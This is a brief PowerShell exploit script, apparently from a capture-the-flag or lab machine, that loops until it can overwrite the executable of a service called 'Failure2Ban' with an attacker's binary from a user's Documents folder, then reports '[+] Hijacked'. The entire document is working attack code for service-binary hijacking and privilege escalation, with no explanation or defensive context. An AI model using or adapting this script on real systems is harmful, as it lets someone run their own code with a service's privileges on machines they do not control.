# xpl.ps1
$svc = 'C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug\Failure2Ban.exe'
$new = 'C:\Users\Olivia.KAT\Documents\xpl.exe'

while ($true) {
    try {
        Copy-Item $new $svc -Force -ErrorAction Stop
        Write-Host "[+] Hijacked"
        break
    	} catch {
    }
}
